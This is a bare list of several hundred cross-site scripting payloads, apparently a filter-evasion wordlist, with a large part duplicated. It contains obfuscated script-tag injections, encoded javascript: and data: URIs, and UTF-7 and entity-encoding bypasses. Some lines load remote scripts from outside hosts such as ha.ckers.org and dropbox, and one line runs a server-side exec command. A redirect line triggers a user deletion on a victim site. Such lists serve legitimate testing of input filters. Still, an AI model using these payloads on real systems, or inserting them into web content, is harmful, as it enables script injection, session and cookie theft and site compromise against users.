&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
&lt;? echo('&lt;SCR)';echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
 &lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT ="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a="&gt;" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;
&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
&lt;A HREF="htt	p://6	6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
&lt;iframe %00 src="&amp;Tab;javascript:prompt(1)&amp;Tab;"%00&gt;
&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'
&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"
&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; {Opera}
&lt;img/src=`%00` onerror=this.onerror=confirm(1) 
&lt;form&gt;&lt;isindex formaction="javascript&amp;colon;confirm(1)"
&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;
&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;
&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?
&lt;iframe/src="data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;
&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/
&amp;#34;&amp;#62;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00
&lt;iframe/src="data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;"&gt;
&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;
&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script
&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;
&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;
&lt;form&gt;&lt;a href="javascript:\u0061lert&amp;#x28;1&amp;#x29;"&gt;X
&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;"/%00*/onerror='eval(src)'&gt;
&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;
&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src="javascript&amp;#58;alert(1)"&amp;#11;&amp;#10;&amp;#09;;&gt;
&lt;a href="data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a
http://www.google&lt;script .com&gt;alert(document.location)&lt;/script
&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;"&gt;XYZ&lt;/a
&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')
&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;
&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^
&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(
&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;"date" onfocus="alert(1)"&gt;
&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&amp;#x28;1&amp;#x29;'&gt;
&lt;script /***/&gt;/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/&lt;/script /***/
&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;
&lt;a href="javascript:void(0)" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;
&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;
&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;
&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN
&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)
&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'
&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}
&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^
&lt;div/style="width:expression(confirm(1))"&gt;X&lt;/div&gt; {IE7}
&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)
//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//
/*iframe/src*/&lt;iframe/src="&lt;iframe/src=@"/onload=prompt(1) /*iframe/src*/&gt;
//|\\ &lt;script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\ &lt;/script //|\\
&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;
&lt;a/href="javascript:&amp;#13; javascript:prompt(1)"&gt;&lt;input type="X"&gt;
&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)
&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}
&lt;a href="javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;"&gt;&lt;button&gt;
&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;
&lt;iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;
&lt;a href="jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;"&gt;X&lt;/a&gt;
&lt;embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
&lt;object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
&lt;var onmouseover="prompt(1)"&gt;On Mouse Over&lt;/var&gt;
&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;
&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;
&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;
&lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;
&lt;iframe/src \/\/onload = prompt(1)
&lt;iframe/onreadystatechange=alert(1)
&lt;svg/onload=alert(1)
&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)
&lt;input type="text" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;
http://www.&lt;script&gt;alert(1)&lt;/script .com
&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;
&lt;svg&gt;&lt;script ?&gt;alert(1)
&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;
&lt;img src=`xx:xx`onerror=alert(1)&gt;
&lt;object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "&gt;&lt;/object&gt;
&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;
&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;
&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1
&lt;a href="data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;"&gt;X&lt;/a
&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE&gt;
&lt;script&gt;~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script U+
&lt;script/src="data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"&gt;&lt;/script a=\u0061 &amp; /=%2F
&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script
&lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;
&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;
&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script
&lt;img src ?itworksonchrome?\/onerror = alert(1)
&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;
&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe
&lt;script x&gt; alert(1) &lt;/script 1=2
&lt;div/onmouseover='alert(1)'&gt; style="x:"&gt;
&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;
&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;
&lt;div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)"&gt;x&lt;/button&gt;
"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;
&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME
&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;
&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;
&lt;a href="data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203"&gt;Click Me&lt;/a&gt;
‘; alert(1);
‘)alert(1);//
&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;
&lt;IMG SRC=jAVasCrIPt:alert(‘XSS’)&gt;
&lt;IMG SRC=”javascript:alert(‘XSS’);”&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;IMG SRC=javascript:alert(‘XSS’)&gt;      
&lt;img src=xss onerror=alert(1)&gt;
&lt;iframe %00 src="&amp;Tab;javascript:prompt(1)&amp;Tab;"%00&gt;
&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'
&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"
&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; {Opera}
&lt;img/src=`%00` onerror=this.onerror=confirm(1)
&lt;form&gt;&lt;isindex formaction="javascript&amp;colon;confirm(1)"
&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;
&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;
&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?
&lt;iframe/src="data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;
&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/
&amp;#34;&amp;#62;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00
&lt;iframe/src="data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;"&gt;
&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;
&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script
&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;
&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;
&lt;form&gt;&lt;a href="javascript:\u0061lert&amp;#x28;1&amp;#x29;"&gt;X
&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;"/%00*/onerror='eval(src)'&gt;
&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;
&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src="javascript&amp;#58;alert(1)"&amp;#11;&amp;#10;&amp;#09;;&gt;
&lt;a href="data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a
http://www.google&lt;script .com&gt;alert(document.location)&lt;/script
&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;"&gt;XYZ&lt;/a
&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')
&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;
&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^
&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(
&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;"date" onfocus="alert(1)"&gt;
&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&amp;#x28;1&amp;#x29;'&gt;
&lt;script /***/&gt;/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/&lt;/script /***/
&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;
&lt;a href="javascript:void(0)" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;
&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;
&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;
&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN
&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)
&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'
&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}
&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^
&lt;div/style="width:expression(confirm(1))"&gt;X&lt;/div&gt; {IE7}
&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)
//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//
/*iframe/src*/&lt;iframe/src="&lt;iframe/src=@"/onload=prompt(1) /*iframe/src*/&gt;
//|\\ &lt;script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\ &lt;/script //|\\
&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;
&lt;a/href="javascript:&amp;#13; javascript:prompt(1)"&gt;&lt;input type="X"&gt;
&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)
&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}
&lt;a href="javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;"&gt;&lt;button&gt;
&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;
&lt;iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;
&lt;a href="jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;"&gt;X&lt;/a&gt;
&lt;embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
&lt;object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;
&lt;var onmouseover="prompt(1)"&gt;On Mouse Over&lt;/var&gt;
&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;
&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;
&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;
&lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;
&lt;iframe/src \/\/onload = prompt(1)
&lt;iframe/onreadystatechange=alert(1)
&lt;svg/onload=alert(1)
&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)
&lt;input type="text" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;
http://www.&lt;script&gt;alert(1)&lt;/script .com
&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;
&lt;svg&gt;&lt;script ?&gt;alert(1)
&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;
&lt;img src=`xx:xx`onerror=alert(1)&gt;
&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;
&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;
&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1
&lt;a href="data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;"&gt;X&lt;/a
&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE&gt;
&lt;script&gt;~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script U+
&lt;script/src="data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"&gt;&lt;/script a=\u0061 &amp; /=%2F
&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script
&lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;
&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;
&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script
&lt;img src ?itworksonchrome?\/onerror = alert(1)
&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;
